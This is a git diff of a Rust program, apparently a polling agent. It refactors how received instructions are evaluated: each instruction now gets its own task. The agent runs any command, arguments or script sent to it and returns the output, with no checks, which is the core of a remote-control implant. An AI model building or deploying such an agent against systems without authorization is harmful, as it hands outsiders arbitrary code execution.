@@ -36,9 +36,7 @@ async fn main() {
     };
 
     let poll = task::spawn(poll(state.clone()));
-    let eval = task::spawn(eval(state.clone()));
-
-    let _ = tokio::join!(poll, eval);
+    let _ = tokio::join!(poll);
 }
 
 async fn poll(state: Arc<RwLock<State>>) {
@@ -59,6 +57,7 @@ async fn poll(state: Arc<RwLock<State>>) {
         match instruction {
             Ok(instruction) => {
                 devlog!("Got instruction: {:#?}", instruction);
+                let _ = task::spawn(eval(state.clone()));
                 state
                     .write()
                     .await
@@ -72,61 +71,54 @@ async fn poll(state: Arc<RwLock<State>>) {
 }
 
 async fn eval(state: Arc<RwLock<State>>) {
-    let mut interval = time::interval(Duration::from_millis(100));
+    let instruction = match state.write().await.get_pending_instruction() {
+        Some(instruction) => instruction,
+        None => return,
+    };
 
-    loop {
-        interval.tick().await;
+    devlog!("Evaluating instruction: {:#?}", instruction);
 
-        let instruction = match state.write().await.get_pending_instruction() {
-            Some(instruction) => instruction,
-            None => continue,
+    match instruction {
+        AgentInstructionBody::Command {
+            ref command,
+            ref command_id,
+            ref args,
+        } => {
+            devlog!(
+                "Executing Command: {:?}, ID: {:?}, Args: {:?}",
+                command,
+                command_id,
+                args
+            );
+
+            // Execute the received command with arguments
+            let output: Output = Command::new(command).args(args).output().await.unwrap();
+
+            // Capture stdout, stderr, and status code
+            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
+            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+            let status_code = output.status.code().unwrap_or(-1); // Fallback to -1 if exit code is not available
+
+            // Print the output for debugging
+            devlog!("Command Output: \nSTDOUT: {}\nSTDERR: {}", stdout, stderr);
+
+            let response_body = AgentResponseBody::CommandResponse {
+                command: command.to_string(),
+                command_id: *command_id,
+                status_code,
+                stdout,
+                stderr,
+            };
+
+            state.write().await.push_response(response_body);
         }
-        .clone();
-
-        devlog!("Evaluating instruction: {:#?}", instruction);
-
-        match instruction {
-            AgentInstructionBody::Command {
-                ref command,
-                ref command_id,
-                ref args,
-            } => {
-                devlog!(
-                    "Executing Command: {:?}, ID: {:?}, Args: {:?}",
-                    command,
-                    command_id,
-                    args
-                );
-
-                // Execute the received command with arguments
-                let output: Output = Command::new(command).args(args).output().await.unwrap();
-
-                // Capture stdout, stderr, and status code
-                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
-                let stderr = String::from_utf8_lossy(&output.stderr).to_string();
-                let status_code = output.status.code().unwrap_or(-1); // Fallback to -1 if exit code is not available
-
-                // Print the output for debugging
-                devlog!("Command Output: \nSTDOUT: {}\nSTDERR: {}", stdout, stderr);
-
-                let response_body = AgentResponseBody::CommandResponse {
-                    command: command.to_string(),
-                    command_id: *command_id,
-                    status_code,
-                    stdout,
-                    stderr,
-                };
-
-                state.write().await.push_response(response_body);
-            }
-            AgentInstructionBody::Script { script } => {
-                task::spawn_blocking(move || {
-                    let mut engine = ScriptingEngine::new();
-                    engine.execute(&script);
-                })
-                .await;
-            }
-            AgentInstructionBody::Ok => {}
+        AgentInstructionBody::Script { script } => {
+            task::spawn_blocking(move || {
+                let mut engine = ScriptingEngine::new();
+                engine.execute(&script);
+            })
+            .await;
         }
+        AgentInstructionBody::Ok => {}
     }
 }
